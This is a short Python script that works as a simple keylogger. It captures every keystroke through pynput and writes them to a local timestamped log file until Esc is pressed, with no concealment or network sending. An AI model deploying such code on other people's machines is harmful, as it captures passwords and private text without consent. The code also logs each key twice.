import logging
import pynput
from pynput.keyboard import Key, Listener
import datetime
import time


class KeystrokeRecorder:
    def __init__(self):
        self.unix_time = int(time.mktime(datetime.datetime.now().timetuple()))
        self.count, self.keys = 0, []
        logging.basicConfig(
            filename=f"log_{self.unix_time}.txt",
            level=logging.DEBUG,
            format="%(message)s",
        )

    def on_press(self, key):
        """Record keystrokes to a log file.

        Args:
            key (string): The current keystroke being pressed by the user.
        """
        self.keys.append(key)
        self.count += 1
        logging.info(f'pressed :key: "{key}"')

        if self.count >= 10:
            self.count = 0
            self.write_file()
            self.keys = []

    def write_file(self):
        """Save the keystrokes to a log file."""
        for key in self.keys:
            k = str(key).replace("'", "")
            if k == "space":
                logging.info("")
            elif k.startswith("Key"):
                logging.info(f"pressed :key: \"{k.split('.')[1]}\"")
            else:
                logging.info(f'pressed :key: "{k}"')

    def on_release(self, key):
        """Kill the program on hitting the `Esc` button.

        Args:
            key (string): Record recent key.
        """
        if key == Key.esc:
            return False


if __name__ == "__main__":
    recorder = KeystrokeRecorder()
    with Listener(
        on_press=recorder.on_press, on_release=recorder.on_release
    ) as listener:
        listener.join()
